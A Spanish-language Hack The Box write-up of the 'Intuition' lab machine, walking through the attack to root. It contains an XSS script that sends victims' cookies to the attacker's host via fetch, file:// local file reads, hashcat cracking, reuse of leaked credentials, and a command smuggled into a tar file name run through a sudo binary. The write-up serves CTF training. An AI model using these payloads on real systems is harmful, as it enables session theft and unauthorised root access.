+++
author = "Andrés Del Cerro"
title = "Hack The Box: Intuitions Writeup | Hard"
date = "2024-07-29"
description = ""
tags = [
    "HackTheBox",
    "Intuitions",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Network Security",
    "Linux",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "LFI",
    "UrlLib Exploitation",
    "Reverse Ingeniering",
    "Credentials Reuse",
    "XSS",
    "Cookie Hijacking",
    "Decrypting Password",
    "Information Leakage",
    "Codebase Exfiltration",
    "Password Cracking",
    "Code Injection",
    "Ansible"
]

+++
# Hack The Box: Intuition Writeup
Welcome to my detailed writeup of the hard difficulty machine **"Intuition"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# Enumeration
Con nmap descubrimos estos puertos abiertos.
```shell
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Haciendo un breve reconocimiento en la web y utilizando `wfuzz` encontramos los siguientes subdominios.

- comprezzor.htb
- report.comprezzor.htb
- auth.comprezzor.htb
- dashboard.comprezzor.htb

En `auth.comprezzor.htb podemos hacernos una cuenta y acceder a `report.comprezzor.htb`

Vemos que se utiliza cifrado LMZA, esto nos recuerda al último backdoor que ocurrió en OpenSSH con la librería "xz" pero no van por ahí los tiros.

# FootHold

Encontramos un XSS en report.comprezzor.htb.
![Write-up Image](images/Screenshot_1.png)

```shell
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.230.246 - - [29/Jul/2024 19:40:09] code 404, message File not found
10.129.230.246 - - [29/Jul/2024 19:40:09] "GET /img.png HTTP/1.1" 404 -
```

## Robando la cookie del moderador
Por lo cual, podemos probar a ver si no hay ningún tipo de sanitización y podemos inyectar un script de javascript.
```javascript
// evil.js
const cookies = document.cookie

fetch("http://10.10.14.71:8000/collect?c=" + document.cookie).
	then(d => console.log("Consulta realizada"))
```

![Write-up Image](images/Screenshot_2.png)

```shell
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.230.246 - - [29/Jul/2024 19:34:05] "GET /evil.js HTTP/1.1" 304 -
10.129.230.246 - - [29/Jul/2024 19:34:05] code 404, message File not found
10.129.230.246 - - [29/Jul/2024 19:34:05] "GET /collect?c=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
```

Esta cookie, podemos utilizarla para iniciar sesión en el subdominio.  `dashboard.comprezzor.htb`

![Write-up Image](images/Screenshot_3.png)

## Robando la cookie del administrador
Después de investigar un rato, podemos suponer que los reportes con alta prioridad serán revisados por un usuario administrador, por lo cual si en este panel si inyectamos otra vez el script malicioso y lo establecemos como alta prioridad..

```shell
10.129.230.246 - - [29/Jul/2024 19:36:55] "GET /collect?c=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1" 404
```

Tenemos una cookie distinta, y si la decodificamos de base64.
```shell
echo "eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5" | base64 -d
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
```

Ahora podemos acceder al panel de administración como el usuario admin.

![Write-up Image](images/Screenshot_4.png)

## Local File Inclusion
En este panel veo una funcionalidad que me llama la atención. `/create_pdf_report` . Lo primero que pienso es en un SSRF pero primero hay que enumerar que hace esta funcionalidad.

![Write-up Image](images/Screenshot_5.png)

Podemos hacer una especie de captura de pantalla de la URL que queramos.
![Write-up Image](images/Screenshot_6.png)

```shell
$ exiftool report_88754.pdf | grep Creator
Creator                         : wkhtmltopdf 0.12.6
```

Podemos ver la herramienta utilizada para esta funcionalidad, y una simple búsqueda en Google nos reporta que esta herramienta tiene una vulnerabilidad de tipo SSRF.
![Write-up Image](images/Screenshot_8.png)

Detecto un comportamiento un tanto extraño
Ya que si intentamos apuntar a un recurso local del sistema nos reporta que la URL es inválida.
![Write-up Image](images/Screenshot_9.png)
Pero si introducimos un espacio delante, nos reporta un error distinto.
![Write-up Image](images/Screenshot_10.png)

Si nos ponemos en escucha con `nc` podemos detectar que de esta función se encarga una utilidad en Python.
```shell
nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.230.246] 55388
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.71:8000
**User-Agent: Python-urllib/3.11**
```

Pero bueno, aprovechandonos del error encontrado al espaciar la URL, podemos cargar un recurso local del sistema con file://.
![Write-up Image](images/Screenshot_11.png)

Ahora cargando el `/proc/self/cmdline` podemos ver cual ha sido el comando para ejecutar el proceso del que depende esta funcionalidad.

![Write-up Image](images/Screenshot_12.png)

## Filtrando el código fuente
Por lo cual, podemos cargar el archivo `/app/code/app.py` y podemos ver dos cosas interesantes.
* Una clave secreta.
* una linea `redirect from blueprints.index.index`

![Write-up Image](images/Screenshot_13.png)

Cargando el archivo ` /app/code/blueprints/index/index.py`
![Write-up Image](images/Screenshot_14.png)

Este archivo no nos sirve de nada pero ya sabemos que la ruta existe.
Una vez sabiendo que esta ruta existe, gracias al `app.py` podemos suponer que también existen estos recursos.
*  `/app/code/blueprints/report/report.py`
*  `/app/code/blueprints/auth/auth.py`
*  `/app/code/blueprints/dashboard/dashboard.py`

Antes, en el panel de administración, había detectado una funcionalidad que no sabía exactamente que es lo que hacía.
![Write-up Image](images/Screenshot_15.png)

Vamos a echar un ojo al archivo `dashboard.py` a ver que contiene..
Si miramos con ojo de halcón, detectamos la siguiente linea.
`ftp.login(user='ftp_admin', passwd='u3jai8y71s2')`

![Write-up Image](images/Screenshot_16.png)

Intento iniciar sesión por ssh pero no es posible.
```shell
ssh ftp_admin@comprezzor.htb
The authenticity of host 'comprezzor.htb (10.129.230.246)' can't be established.
ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'comprezzor.htb' (ED25519) to the list of known hosts.
ftp_admin@comprezzor.htb's password:
```

Recordemos que el puerto `21/TCP` estaba cerrado, pero gracias a este LFI, podemos cargar recursos del FTP ya que podemos solicitar el recurso `ftp://ftp_admin:u3jai8y71s2@ftp.local`

## Consiguiendo una id_rsa
![Write-up Image](images/Screenshot_17.png)
Hay un archivo `private-*.key` que me llama la atención.

Ahora lo podemos solicitar a través del SSRF con ` ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key`

Y tenemos una clave privada.
![Write-up Image](images/Screenshot_18.png)

Como no se para que usuario es esta clave privada, podemos revisar el archivo `welcome_note.txt`
Y vemos que esto es para los desarrolladores, por lo cual el nombre de usuario seguramente contenga la palabra `dev`.
Además también vemos una passphrase para esta clave privada. `Y27SH19HDIWD`

![Write-up Image](images/Screenshot_19.png)

Pero simplemente podemos comprobar a que usuario pertenece esta clave privada validando a con `ssh-add` la passphrase que hemos encontrado añadiendola a nuestro repositorio de claves privadas.

```shell
$ ssh-add id_rsa 
Enter passphrase for id_rsa: 
Identity added: id_rsa (dev_acc@local)
```

`dev_acc` es el nombre de usuario de esta clave privada, ahora vamos a intentar iniciar sesión en la máquina víctima.
Aunque antes vamos a eliminar la clave privada de mi repositorio.
```shell
$ ssh-add -d id_rsa 
Identity removed: id_rsa RSA (no comment)
```

```shell
$ ssh dev_acc@comprezzor.htb -i id_rsa 
Enter passphrase for key 'id_rsa': 
Last login: Mon Jul 29 16:29:28 2024 from 10.10.14.71
dev_acc@intuition:~$ id
uid=1001(dev_acc) gid=1001(dev_acc) groups=1001(dev_acc)
```

# User Pivoting
Enumerando la aplicación web en `/var/www/app` podemos ver que de base de datos utiliza SQLite3 ya que se emplean archivos `.db`.

```shell
dev_acc@intuition:/var/www/app/blueprints/report$ ls
__pycache__  report.py  report_utils.py  reports.db  reports.sql
```

Por lo cual, para acceder a los usuarios de la plataforma (recordemos que había una sección de autenticación) simplemente tenemos que acceder al archivo `.db` correspondiente.

## Crackeando el hash de `adam`
```shell
dev_acc@intuition:/var/www/app/blueprints/auth$ ls -la
total 40
drwxr-xr-x 3 root root  4096 Jul 29 16:30 .
drwxr-xr-x 6 root root  4096 Apr 10 08:21 ..
drwxr-xr-x 2 root root  4096 Apr 10 08:21 __pycache__
-rw-r--r-- 1 root root  1842 Sep 18  2023 auth.py
-rw-r--r-- 1 root root  3038 Sep 19  2023 auth_utils.py
-rw-r--r-- 1 root root 16384 Jul 29 16:30 users.db
-rw-r--r-- 1 root root   171 Sep 18  2023 users.sql
```

Vemos al usuario `adam` y `admin` y un hash sha256.
![Write-up Image](images/Screenshot_20.png)

Este hash lo podemos identificar y crackear con el modo autodetect de `hashcat`.

```cmd
C:\Users\pc\Desktop\hashcat-6.2.6>.\hashcat.exe  .\hash.txt .\rockyou.txt
```

```cmd
sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 30120 (Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)))
Hash.Target......: sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc...89fc43
Time.Started.....: Mon Jul 29 18:46:39 2024 (2 secs)
Time.Estimated...: Mon Jul 29 18:46:41 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (.\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6201.3 kH/s (12.48ms) @ Accel:256 Loops:1 Thr:64 Vec:1
```

Pero esta no es la contraseña para el usuario `adam`
```shell
dev_acc@intuition:/var/www/app/blueprints/auth$ su adam
Password: 
su: Authentication failure
```

Así que vamos a intentar enumerar el FTP ya que antes hemos visto que estaba abierto.

```shell
dev_acc@intuition:/var/www/app/blueprints/auth$ ftp adam@127.0.01
Connected to 127.0.01.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Dentro del FTP, en `/backup/runner1` nos encontramos los siguientes ficheros.

```shell
150 File status okay. About to open data connection.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
```

```shell
# run-tests.sh
#!/bin/bash

# List playbooks
./runner1 list

# Run playbooks [Need authentication]
# ./runner run [playbook number] -a [auth code]
#./runner1 run 1 -a "UHI75GHI****"

# Install roles [Need authentication]
# ./runner install [role url] -a [auth code]
#./runner1 install http://role.host.tld/role.tar -a "UHI75GHI****"
```

Aquí podemos ver que se utiliza un tipo de código de autenticación el cual podemos ver entero excepto 4 carácteres.

El binario runner1 suponemos que es el archivo runner1.c compilado, vamos a echarle un vistazo. 

```C
// runner1.c
// Version : 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/md5.h>

#define INVENTORY_FILE "/opt/playbooks/inventory.ini"
#define PLAYBOOK_LOCATION "/opt/playbooks/"
#define ANSIBLE_PLAYBOOK_BIN "/usr/bin/ansible-playbook"
#define ANSIBLE_GALAXY_BIN "/usr/bin/ansible-galaxy"
#define AUTH_KEY_HASH "0feda17076d793c2ef2870d7427ad4ed"

int check_auth(const char* auth_key) {
    unsigned char digest[MD5_DIGEST_LENGTH];
    MD5((const unsigned char*)auth_key, strlen(auth_key), digest);

    char md5_str[33];
    for (int i = 0; i < 16; i++) {
        sprintf(&md5_str[i*2], "%02x", (unsigned int)digest[i]);
    }

    if (strcmp(md5_str, AUTH_KEY_HASH) == 0) {
        return 1;
    } else {
        return 0;
    }
}

void listPlaybooks() {
    DIR *dir = opendir(PLAYBOOK_LOCATION);
    if (dir == NULL) {
        perror("Failed to open the playbook directory");
        return;
    }

    struct dirent *entry;
    int playbookNumber = 1;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
            printf("%d: %s\n", playbookNumber, entry->d_name);
            playbookNumber++;
        }
    }

    closedir(dir);
}

void runPlaybook(const char *playbookName) {
    char run_command[1024];
    snprintf(run_command, sizeof(run_command), "%s -i %s %s%s", ANSIBLE_PLAYBOOK_BIN, INVENTORY_FILE, PLAYBOOK_LOCATION, playbookName);
    system(run_command);
}

void installRole(const char *roleURL) {
    char install_command[1024];
    snprintf(install_command, sizeof(install_command), "%s install %s", ANSIBLE_GALAXY_BIN, roleURL);
    system(install_command);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    int auth_required = 0;
    char auth_key[128];

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0) {
            if (i + 1 < argc) {
                strncpy(auth_key, argv[i + 1], sizeof(auth_key));
                auth_required = 1;
                break;
            } else {
                printf("Error: -a option requires an auth key.\n");
                return 1;
            }
        }
    }

    if (!check_auth(auth_key)) {
        printf("Error: Authentication failed.\n");
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        listPlaybooks();
    } else if (strcmp(argv[1], "run") == 0) {
        int playbookNumber = atoi(argv[2]);
        if (playbookNumber > 0) {
            DIR *dir = opendir(PLAYBOOK_LOCATION);
            if (dir == NULL) {
                perror("Failed to open the playbook directory");
                return 1;
            }

            struct dirent *entry;
            int currentPlaybookNumber = 1;
            char *playbookName = NULL;

            while ((entry = readdir(dir)) != NULL) {
                if (entry->d_type == DT_REG && strstr(entry->d_name, ".yml") != NULL) {
                    if (currentPlaybookNumber == playbookNumber) {
                        playbookName = entry->d_name;
                        break;
                    }
                    currentPlaybookNumber++;
                }
            }

            closedir(dir);

            if (playbookName != NULL) {
                runPlaybook(playbookName);
            } else {
                printf("Invalid playbook number.\n");
            }
        } else {
            printf("Invalid playbook number.\n");
        }
    } else if (strcmp(argv[1], "install") == 0) {
        installRole(argv[2]);
    } else {
        printf("Usage2: %s [list|run playbook_number|install role_url] -a <auth_key>\n", argv[0]);
        return 1;
    }

    return 0;
}
```

Este programa en C permite gestionar playbooks de Ansible, listar archivos de playbooks, ejecutar playbooks específicos y instalar roles de Ansible Galaxy, todo ello tras una verificación de autenticación mediante una clave hash MD5. A continuación se explica detalladamente cada sección del programa:

1. **Definiciones y Constantes:**
    
    - Se definen las ubicaciones de archivos y comandos necesarios.
    - `AUTH_KEY_HASH` almacena un hash MD5 para la autenticación.
2. **Función `check_auth`:**
    
    - Toma una clave de autenticación (`auth_key`) y calcula su hash MD5.
    - Compara el hash calculado con `AUTH_KEY_HASH`.
    - Devuelve 1 si coinciden, indicando autenticación exitosa, o 0 en caso contrario.
3. **Función `listPlaybooks`:**
    
    - Abre el directorio especificado en `PLAYBOOK_LOCATION`.
    - Lista todos los archivos que terminan en `.yml`, numerándolos.
4. **Función `runPlaybook`:**
    
    - Construye un comando para ejecutar un playbook específico usando `ansible-playbook`.
    - Usa el archivo de inventario especificado en `INVENTORY_FILE`.
5. **Función `installRole`:**
    
    - Construye un comando para instalar un rol de Ansible Galaxy usando `ansible-galaxy`.
6. **Función `main`:**
    
    - Procesa los argumentos de la línea de comandos.
    - Verifica que se ha proporcionado una clave de autenticación y la comprueba.
    - Según el primer argumento (`list`, `run`, `install`):
        - Llama a `listPlaybooks` para listar los playbooks.
        - Llama a `runPlaybook` para ejecutar un playbook específico, determinado por su número en la lista.
        - Llama a `installRole` para instalar un rol desde una URL.

## Crackeando el hash de runner.c
El flujo principal del programa incluye una verificación de autenticación antes de permitir cualquier operación. Si la autenticación falla, el programa termina con un mensaje de error.

Este hash MD5 lo podemos crackear ya que sabemos que la contraseña empieza por "UHI75GHI" y sigue por 4 carácteres que probablemente sean mayúsculas y numéricos.

Con hashcat podemos hacer un ataque de fuerza bruta por máscara.

`hashcat -m 0 -a 3 -1 ?u?d hashes.txt UHI75GHI?1?1?1?1

```cmd
0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
Time.Started.....: Mon Jul 29 19:01:29 2024 (0 secs)
Time.Estimated...: Mon Jul 29 19:01:29 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: UHI75GHI?1?1?1?1 [12]
Guess.Charset....: -1 ?u?d, -2 Undefined, -3 Undefined, -4 Undefined
```

Por ahora esta password no nos sirve de nada, pero nos servirá para terminar de escalar privilegios.

## Information Leakage via privileged logs
Pasando el `linpeas.sh` podemos ver algo extraño.
![Write-up Image](images/Screenshot_21.png)

Vamos a revisar ese directorio.

Vemos un montón de logs y tenemos permiso de lectura.
```shell
dev_acc@intuition:/var/log/suricata$ ls -la
total 40576
drwxr-xr-x  2 root root       4096 Jul 29 15:08 .
drwxrwxr-x 12 root syslog     4096 Jul 29 15:08 ..
-rw-r--r--  1 root root          0 Jul 29 15:08 eve.json
-rw-r--r--  1 root root   16703683 Jul 29 15:08 eve.json.1
-rw-r--r--  1 root root    5760612 Oct 26  2023 eve.json.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 eve.json.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 eve.json.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 eve.json.1-2024072915.backup
-rw-r--r--  1 root root     214743 Oct 28  2023 eve.json.5.gz
-rw-r--r--  1 root root    5050595 Oct 14  2023 eve.json.7.gz
-rw-r--r--  1 root root     972578 Sep 29  2023 eve.json.8.gz
-rw-r--r--  1 root root          0 Jul 29 15:08 fast.log
-rw-r--r--  1 root root          0 Jul 29 15:08 fast.log.1
-rw-r--r--  1 root root          0 Oct 26  2023 fast.log.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 fast.log.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 fast.log.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 fast.log.1-2024072915.backup
-rw-r--r--  1 root root         20 Oct 26  2023 fast.log.5.gz
-rw-r--r--  1 root root       1033 Oct  8  2023 fast.log.7.gz
-rw-r--r--  1 root root       1485 Sep 28  2023 fast.log.8.gz
-rw-r--r--  1 root root          0 Jul 29 15:08 stats.log
-rw-r--r--  1 root root    7741988 Jul 29 15:08 stats.log.1
-rw-r--r--  1 root root    4293890 Oct 26  2023 stats.log.1-2024040114.backup
-rw-r--r--  1 root root          0 Apr  8 14:19 stats.log.1-2024042213.backup
-rw-r--r--  1 root root          0 Apr 22 13:26 stats.log.1-2024042918.backup
-rw-r--r--  1 root root          0 Apr 29 18:27 stats.log.1-2024072915.backup
-rw-r--r--  1 root root      73561 Oct 28  2023 stats.log.5.gz
-rw-r--r--  1 root root     376680 Oct 14  2023 stats.log.7.gz
-rw-r--r--  1 root root      67778 Sep 29  2023 stats.log.8.gz
-rw-r--r--  1 root root          0 Jul 29 15:08 suricata.log
-rw-r--r--  1 root root      26867 Jul 29 15:08 suricata.log.1
-rw-r--r--  1 root root       3893 Oct 26  2023 suricata.log.1-2024040114.backup
-rw-r--r--  1 root root      68355 Apr  8 14:19 suricata.log.1-2024042213.backup
-rw-r--r--  1 root root      95100 Apr 22 13:26 suricata.log.1-2024042918.backup
-rw-r--r--  1 root root      26145 Apr 29 18:27 suricata.log.1-2024072915.backup
-rw-r--r--  1 root root        990 Apr  1 14:50 suricata.log.5.gz
-rw-r--r--  1 root root       1412 Oct 19  2023 suricata.log.7.gz
-rw-r--r--  1 root root       5076 Oct  8  2023 suricata.log.8.gz
```

Con zgrep podemos filtrar por palabras que nos interesen como `user` y `pass`
`zgrep -i -w pass ./*.gz | less`

Y podemos detectar una supuesta credencial en el fichero `eve.json` -> `Lopezzz1992%123`
![Write-up Image](images/Screenshot_22.png)

También podemos ver que esa solicitud fue respondida con un `Authentication failed`

Un poco mas abajo vemos la supuesta contraseña válida.
![Write-up Image](images/Screenshot_23.png)

Existe un usuario `lopez` en el sistema, por lo cual podemos intentar pivotar a este usuario.
```shell
dev_acc@intuition:/var/log/suricata$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
adam:x:1002:1002:,,,:/home/adam:/bin/bash
dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
```

¡Somos `lopez`!
```shell
dev_acc@intuition:/var/log/suricata$ su lopez
Password: 
lopez@intuition:/var/log/suricata$
```

Podemos ejecutar como cualquier usuario el binario `runner2`
```shell
lopez@intuition:/var/log/suricata$ sudo -l
[sudo] password for lopez: 
Matching Defaults entries for lopez on intuition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User lopez may run the following commands on intuition:
    (ALL : ALL) /opt/runner2/runner2
```
# Local Privilege Escalation
## Ingeniería inversa al binario runner2
Me pide un archivo `json`
```shell
lopez@intuition:/var/log/suricata$ sudo /opt/runner2/runner2
Usage: /opt/runner2/runner2 <json_file>
```

Si creamos un comprimido con un archivo json vacío y se lo pasamos al binario..
```shell
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 /tmp/test.tar.gz 
Error parsing JSON data.
```

Como por detrás se está usando ansible-playbooks, podemos deducir que para la gestión de este comprimido se está utilizando ansible-galaxy

Abriendo el binario con ghidra vemos la estructura que debe de tener el archivo .json mas o menos.
![Write-up Image](images/Screenshot_24.png)

Sabemos que tiene que tener un atributo `run` y `action`
![Write-up Image](images/Screenshot_25.png)

Dentro del atributo `run` vemos que tiene que tener un atributo `auth_code` que suponemos que es el mismo que para el binario `runner1`
![Write-up Image](images/Screenshot_26.png)

Y dentro el atributo `run` , si la `action` es `install` , debe de haber otro atributo llamado `role_file`
![Write-up Image](images/Screenshot_27.png)

Si todo sale bien se llama al método `installRole`

```C
// InstallRole Method
void installRole(undefined8 param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = isTarArchive(param_1);
  if (iVar1 == 0) {
    fwrite("Invalid tar archive.\n",1,0x15,stderr);
  }
  else {
    snprintf(local_418,0x400,"%s install %s","/usr/bin/ansible-galaxy",param_1);
    system(local_418);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Este método requiere un archivo .tar y le pasa al binario /usr/bin/ansible-galaxy el parámetro que recibe el método.
En este caso es lo que esté en el atributo `role_file`

![Write-up Image](images/Screenshot_28.png)

Por lo cual si en el `role_file` incluimos un archivo .tar válido y acto seguimos inyectamos un comando, podríamos ejecutar un comando como el usuario `root`.

En el archivo se realiza una válidación del archivo .tar, por lo cual podemos crear un archivo .tar que se llame "loquesea.tar.gz;id" y así inyectar el comando.

Así habría quedado el archivo .json
```json
{
  "run": {
    "action": "install",
    "role_file": "/tmp/test.tar.gz;id"
  },
  "auth_code": "UHI75GHINKOP"
}
```

Ahora creamos el archivo .tar
```shell
lopez@intuition:/tmp$ tar -cvf test.tar.gz test.json 
test.json
```

## Inyectando un comando como `root`

Ahora cambiamos el nombre al archivo .tar
```shell
lopez@intuition:/tmp$ mv "test.tar.gz" "test.tar.gz;id"
```

```shell
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
Starting galaxy role install process
[WARNING]: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
attempting to call Galaxy at 'https://galaxy.ansible.com/api/': <urlopen error [Errno -3]
Temporary failure in name resolution>
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
uid=0(root) gid=0(root) groups=0(root)
```

Y se acontece la inyección del comando `id` y se ejecuta como el usuario `root`

Ahora para conseguir una bash, cambiamos el nombre del archivo a `test.tar.gz;bash`
```shell
lopez@intuition:/tmp$ mv "test.tar.gz;chmod u+s bash" "test.tar.gz;bash"
```

Cambiamos el archivo .json
```json
{
  "run": {
    "action": "install",
    "role_file": "/tmp/test.tar.gz;bash"
  },
  "auth_code": "UHI75GHINKOP"
}
```

Y ejecutamos el binario..
```shell
lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
Starting galaxy role install process
[WARNING]: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
attempting to call Galaxy at 'https://galaxy.ansible.com/api/': <urlopen error [Errno -3]
Temporary failure in name resolution>
ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
root@intuition:/tmp# cat test.json
{
  "run": {
    "action": "install",
    "role_file": "/tmp/test.tar.gz;bash"
  },
  "auth_code": "UHI75GHINKOP"
}
root@intuition:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

¡Y ya estaría!